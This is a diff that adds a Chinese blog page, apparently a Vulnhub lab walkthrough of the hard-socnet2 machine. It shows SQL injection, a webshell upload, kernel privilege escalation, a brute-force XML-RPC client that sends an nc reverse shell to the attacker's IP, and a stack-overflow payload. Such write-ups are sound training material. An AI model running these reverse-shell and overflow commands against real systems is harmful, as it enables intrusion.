@@ -1,0 +1,255 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>hard-socnet2 - yifang</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Vulnhub靶机打靶-hard-socnet2靶机详情难度：高
+涉及知识：
+
+主机发现
+
+端口扫描
+
+SQL注入
+
+文件上传
+
+蚁剑上线
+
+CVE-2021-3493
+
+XMLRPC
+
+逆向工程
+,"> 
+    <meta name="author" content="yifang"> 
+    <link rel="alternative" href="atom.xml" title="yifang" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">yifang</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">hard-socnet2</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">hard-socnet2</h1>
+        <div class="stuff">
+            <span>十一月 06, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Vulnhub靶机打靶-hard-socnet2"><a href="#Vulnhub靶机打靶-hard-socnet2" class="headerlink" title="Vulnhub靶机打靶-hard-socnet2"></a>Vulnhub靶机打靶-hard-socnet2</h1><h2 id="靶机详情"><a href="#靶机详情" class="headerlink" title="靶机详情"></a>靶机详情</h2><p>难度：高</p>
+<p>涉及知识：</p>
+<ul>
+<li><p>主机发现</p>
+</li>
+<li><p>端口扫描</p>
+</li>
+<li><p>SQL注入</p>
+</li>
+<li><p>文件上传</p>
+</li>
+<li><p>蚁剑上线</p>
+</li>
+<li><p>CVE-2021-3493</p>
+</li>
+<li><p>XMLRPC</p>
+</li>
+<li><p>逆向工程</p>
+</li>
+<li><p>动态调试</p>
+</li>
+<li><p>缓冲区溢出</p>
+</li>
+<li><p>漏洞利用代码编写</p>
+</li>
+</ul>
+<hr>
+<p>靶机下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova">https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</a></p>
+<p>攻击方法有2种，CVE-2021-3493 另类提权方式</p>
+<hr>
+<p>攻击主机：kali Linux 2021 192.168.0.103</p>
+<p>目标主机： Ubuntu 18</p>
+<h2 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -sC 192.168.0.102</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/nmap.png"></p>
+<p>目标主机打开了22，80，8000端口</p>
+<p>经过测试，80页面允许正常访问，8000端口不允许任何HTTP连接方式，猜测可能存在另类服务。</p>
+<p>访问80页面发现存在当前页面，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/80.png" alt="80"></p>
+<p>二话不说直接进行sqlmap跑一波<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071201750.png" alt="sql"></p>
+<p>前端存在SQL漏洞，获得admin账户进行登录，使用更改头像功能，上次一句话木马，<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071202189.png" alt="eval"></p>
+<p>蚁剑测试连接成功！<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071202528.png" alt="antsword"></p>
+<p>可以看到获得的权限为www-data权限，尝试进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html/data/images/profiles) $ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:    Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.1 LTS</span><br><span class="line">Release:    18.04</span><br><span class="line">Codename:    bionic</span><br></pre></td></tr></table></figure>
+
+<p>发现目标为Ubuntu 18.04 LTS版本</p>
+<p>尝试使用最新的EXP CVE-2021-9493（蚁剑的shell无法提权shell需要转nc shell）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071205198.png" alt="ncshell"></p>
+<p>上传exp文件运行，getshell，id查看自己的身份为root 打靶结束<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071202582.png" alt="cvegetshell"></p>
+<hr>
+<p>不会以为就这样就结束了吧！！！</p>
+<p>该靶机可是高难度的靶机！！！能如此轻松的解决这个靶机根本原因也是因为——该靶机为2020年的靶机，而刚才的打靶过程中，可是用到了2021年的CVE，也就是说我在用前朝的剑斩本朝的君！</p>
+<h2 id="正常操作"><a href="#正常操作" class="headerlink" title="正常操作"></a>正常操作</h2><p>回到www-data权限下，尝试正常的得到shell权限，首先发现/home/socnet/monitor.py文件，打开文件查看一波！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到使用了xmlRPC库，百度大法，找到一个xmlRPC的一个客户端，然后大致的修改一下，对secure_cmd函数进行爆破，尝试提权为socnet用户权限</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    word = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.0.102:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">        res = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.103 6666 &gt;/tmp/f&#x27;</span>,word))</span><br></pre></td></tr></table></figure>
+
+<p>可能要多等一会</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071210565.png" alt="xmlrpc"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>python 获得pty 对ncshell进行升级</p>
+<p>发现存在一个add_record文件</p>
+<p>在目标主机上，使用gdb进行动态调试，发现在Explain参数里面存在内存溢出<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071209670.png" alt="gdb"></p>
+<p>重点关注EIP寄存器被溢出了大量的’1111’</p>
+<p>精确找到’1111’的具体位置（使用二分法判断）<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071207910.png" alt="eip"></p>
+<p>得出偏移量为62</p>
+<p>对汇编代码进行分析，发现存在vuln函数和backdoor函数，尝试溢出backdoor的起始内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import struct; print(&#x27;a\n1\n1\n1\n1&#x27;+ &#x27;A&#x27;*61 +struct.pack(&#x27;I&#x27;,0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure>
+
+<p>生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071208625.png" alt="getshell"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
